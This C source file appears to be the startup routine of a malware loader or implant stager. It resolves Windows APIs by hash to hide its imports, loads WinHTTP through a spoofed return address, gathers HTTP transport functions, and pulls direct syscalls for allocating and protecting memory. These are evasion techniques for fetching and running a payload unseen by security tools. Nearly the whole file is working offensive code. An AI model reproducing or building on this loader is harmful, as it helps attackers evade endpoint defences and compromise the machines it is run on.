#include <windows.h>

#include "ntdll.h"
#include "Instance.h"
#include "Prototypes.h"
#include "PreHash.h"

D_SEC(C) BYTE winHttpModName[] = "Winhttp.dll";

D_SEC(B)
VOID PreMain(
    _In_ PVOID Param)
{
    INSTANCE Inst;

    Inst.Module.Kernel32    = xGetModuleHandle(HASH_Kernel32);
    Inst.Module.Ntdll       = xGetModuleHandle(HASH_Ntdll);
    Inst.Module.Kernelbase  = xGetModuleHandle(HASH_Kernelbase);

    if (!Inst.Module.Kernel32 || !Inst.Module.Ntdll)
    {
        return;
    }

    Inst.Win32.LocalAlloc       = xGetProcAddress(Inst.Module.Kernel32, HASH_LocalAlloc);
    Inst.Win32.LocalReAlloc     = xGetProcAddress(Inst.Module.Kernel32, HASH_LocalReAlloc);
    Inst.Win32.LocalFree        = xGetProcAddress(Inst.Module.Kernel32, HASH_LocalFree);
    Inst.Win32.LoadLibraryA     = xGetProcAddress(Inst.Module.Kernel32, HASH_LoadLibraryA);

    if (
        !Inst.Win32.LoadLibraryA        ||
        !Inst.Win32.LocalAlloc          ||
        !Inst.Win32.LocalReAlloc        ||
        !Inst.Win32.LocalFree
        )
    {
        return;
    }

    Inst.Module.Winhttp = SpoofRetAddr(Inst.Win32.LoadLibraryA, Inst.Module.Kernelbase, &winHttpModName, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    if (!Inst.Module.Winhttp)
    {
        return;
    }
    Inst.Transport.WinHttpOpen              = xGetProcAddress(Inst.Module.Winhttp, HASH_WinHttpOpen);
    Inst.Transport.WinHttpConnect           = xGetProcAddress(Inst.Module.Winhttp, HASH_WinHttpConnect);
    Inst.Transport.WinHttpOpenRequest       = xGetProcAddress(Inst.Module.Winhttp, HASH_WinHttpOpenRequest);
    Inst.Transport.WinHttpSendRequest       = xGetProcAddress(Inst.Module.Winhttp, HASH_WinHttpSendRequest);
    Inst.Transport.WinHttpReceiveResponse   = xGetProcAddress(Inst.Module.Winhttp, HASH_WinHttpReceiveResponse);
    Inst.Transport.WinHttpReadData          = xGetProcAddress(Inst.Module.Winhttp, HASH_WinHttpReadData);
    Inst.Transport.WinHttpCloseHandle       = xGetProcAddress(Inst.Module.Winhttp, HASH_WinHttpCloseHandle);

    if (
        !Inst.Transport.WinHttpOpen             ||
        !Inst.Transport.WinHttpConnect          ||
        !Inst.Transport.WinHttpOpenRequest      ||
        !Inst.Transport.WinHttpSendRequest      ||
        !Inst.Transport.WinHttpReceiveResponse  ||
        !Inst.Transport.WinHttpReadData         ||
        !Inst.Transport.WinHttpCloseHandle
        )
    {
        return;
    }

    if (!GetSyscall(xGetProcAddress(Inst.Module.Ntdll, HASH_NtAllocateVirtualMemory), &Inst.Sys.NtAllocateVirtualMemory))
    {
        return;
    }

    if (!GetSyscall(xGetProcAddress(Inst.Module.Ntdll, HASH_NtProtectVirtualMemory), &Inst.Sys.NtProtectVirtualMemory))
    {
        return;
    }

    Main(Param, &Inst);
}